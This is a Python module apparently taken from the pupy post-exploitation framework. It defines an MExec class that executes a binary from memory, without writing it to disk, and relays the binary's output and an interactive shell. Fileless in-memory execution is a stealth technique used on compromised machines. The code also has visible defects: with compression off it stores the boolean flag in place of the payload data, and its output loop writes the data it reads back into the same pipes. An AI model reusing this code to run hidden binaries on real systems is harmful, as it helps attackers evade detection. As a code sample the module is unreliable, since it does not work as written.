# -*- coding: utf-8 -*-

import sys
import time
import os
import ctypes
import traceback
import time
import threading
import zlib

from select import select
from pupy import mexec
from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK, read

class MExec(object):
    def __init__(self, data, argv0, args=[], no_stdin=True, no_stdor=False, redirect_stdio=True, compressed=False):
        self.argv = [ argv0 ] + [ x for x in args ]
        self.data = zlib.decompress(data) if compressed else compressed
        self.redirect_stdio = redirect_stdio
        self.no_stdin = no_stdin
        self.no_stdor = no_stdor
        self.stdin = None
        self.stdout = None
        self.stderr = None
        self.pid = -1
        self.EOF = threading.Event()
        self._saved_stdout = ''
        self._closed = False

    def close(self):
        if self._closed:
            return

        if self.pid:
            try:
                os.kill(self.pid, 9)
            except OSError:
                pass

            self.pid = None

        if self.stdin:
            self.stdin.close()

        if self.stdout:
            self._saved_stdout = self.stdout.read()
            self.stdout.close()

        if self.stderr:
            self._saved_stdout = self._saved_stdout + self.stderr.read()
            self.stderr.close()

        self._closed = True

    def __del__(self):
        self.close()

    def get_stdout(self):
        if self.no_stdor:
            raise ValueError('You need to specify no_stdor=False to run get_stdout()')

        if self._closed:
            return self._saved_stdout

        if not self.no_stdin:
            self.stdin.close()

        output = self.stdout.read()
        error = self.stderr.read()

        self.stdout.close()
        self.stderr.close()

        self._saved_stdout = output + error
        self._closed = True
        self.EOF.set()

        return self._saved_stdout

    def stdor_loop(self):
        if self.no_stdor:
            raise ValueError('You need to specify no_stdor=False to run stdor_loop')

        try:
            flags = fcntl(self.stdout, F_GETFL)
            fcntl(self.stdout, F_SETFL, flags | O_NONBLOCK)

            flags = fcntl(self.stderr, F_GETFL)
            fcntl(self.stderr, F_SETFL, flags | O_NONBLOCK)

            fds = [self.stderr, self.stdout]

            while fds and not self.EOF.is_set():
                r, _, _ = select(fds, [], [], 5)
                if not r and not self.EOF.is_set():
                    continue

                for f in r:
                    data = f.read()
                    if data:
                        if f == self.stderr:
                            self.stderr.write(data)
                            self.stderr.flush()
                        else:
                            self.stdout.write(data)
                            self.stdout.flush()
                    else:
                        fds.remove(f)

            self.EOF.set()

        finally:
            self.close()

    def get_shell(self):
        if self.no_stdin:
            raise ValueError('You need to specify no_stdin=False to use shell')

        if self.no_stdor:
            raise ValueError('You need to specify no_stdor=False to use shell')

        try:
            reader = threading.Thread(target=self.stdor_loop)
            reader.daemon = True
            reader.start()

            while not self.EOF.is_set():
                line = raw_input()
                if line == 'exit':
                    self.EOF.set()
                else:
                    self.stdin.write(line)
                    self.stdin.flush()

        except KeyboardInterrupt:
            self.EOF.set()

        finally:
            self.close()

    def run(self):
        pid, stdior = mexec(
            self.data, self.argv,
            self.redirect_stdio, True
        )

        self.pid = pid
        self.stdin, self.stdout, self.stderr = stdior

        if self.no_stdin:
            self.stdin.close()
            self.stdin = None

        if self.no_stdor:
            self.stdout.close()
            self.stdout = None
            self.stderr.close()
            self.stderr = None
